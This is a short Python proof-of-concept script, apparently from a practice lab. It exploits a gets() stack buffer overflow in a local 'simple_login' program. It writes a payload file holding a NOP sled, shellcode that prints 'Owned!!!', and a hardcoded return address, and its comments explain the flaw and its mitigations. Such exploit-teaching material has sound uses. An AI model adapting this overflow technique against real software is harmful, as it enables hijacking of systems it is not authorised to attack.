# Author: Abhinav Thakur
# Email : compilepeace@gmail.com
# Description : This exploit takes advantage of gets() which does not perform bound checking on the
#				user input data which as a result overflows the buffer and write the return pointer
# 				of authorize()'s stack frame and hijacking the code flow of the program leading to
#				arbitary code execution.
#
# Mitigation  : Developer should not use 'gets()' at any cost (and also take warnings issued by the
#				compiler seriously) and always do the bound checking and validate the user input 
#				properly. Several modern mitigation techniques are in place to prevent stack overflow
#				attacks from happening which include - Canary check and NX(non-executable) stack 
#				which (depending on the situation) can sometimes also be bepassed.
#
# Usage : $ cat malacious_input_simple_login | ./simple_login


import struct


shellcode = ("\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x04\xb3\x01\x68\x64\x21\x21\x21\x68\x4f\x77\x6e\x65\x89\xe1\xb2\x08\xcd\x80\xb0\x01\x31\xdb\xcd\x80")


payload = "\x90" * (68 - len(shellcode))
payload += shellcode
payload += struct.pack("I", 0xbffff598)

fo = open("malacious_input_simple_login", "w")
fo.write(payload)
fo.close()

